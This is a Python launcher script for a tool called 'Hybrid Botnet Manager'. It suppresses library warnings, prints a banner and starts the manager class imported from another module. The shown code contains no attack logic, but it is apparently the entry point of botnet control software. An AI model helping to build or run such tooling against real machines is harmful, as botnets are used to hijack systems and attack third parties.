#!/usr/bin/env python3
"""
Clean startup script for Hybrid Botnet Manager
Suppresses warnings and provides clean output
"""

import os
import sys
import warnings

def suppress_warnings():
    """Suppress all deprecation warnings from third-party libraries"""
    # Suppress kamene/cryptography warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    warnings.filterwarnings("ignore", category=FutureWarning)
    warnings.filterwarnings("ignore", message=".*has been moved to cryptography.hazmat.decrepit.*")
    warnings.filterwarnings("ignore", message=".*Blowfish.*")
    warnings.filterwarnings("ignore", message=".*TripleDES.*") 
    warnings.filterwarnings("ignore", message=".*CAST5.*")
    
    # Suppress other common warnings
    warnings.filterwarnings("ignore", message=".*can't import layer ipsec.*")

def print_banner():
    """Print clean startup banner"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                HYBRID BOTNET MANAGER                        ║
║                    Clean Start Mode                         ║
║              CLI + Web Interface                            ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print("🚀 Starting clean mode (warnings suppressed)...")
    print("📍 Working directory:", os.getcwd())
    print("🐍 Python version:", sys.version.split()[0])
    print()

def main():
    """Main entry point"""
    suppress_warnings()
    print_banner()
    
    # Import and run the main application
    try:
        from hybrid_botnet_manager import HybridBotnetManager
        
        print("✅ Imports successful")
        print("🔧 Initializing Hybrid Botnet Manager...")
        print()
        
        manager = HybridBotnetManager()
        manager.run()
        
    except KeyboardInterrupt:
        print("\n👋 Shutdown requested by user")
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("💡 Make sure you're in the correct directory and virtual environment is activated")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
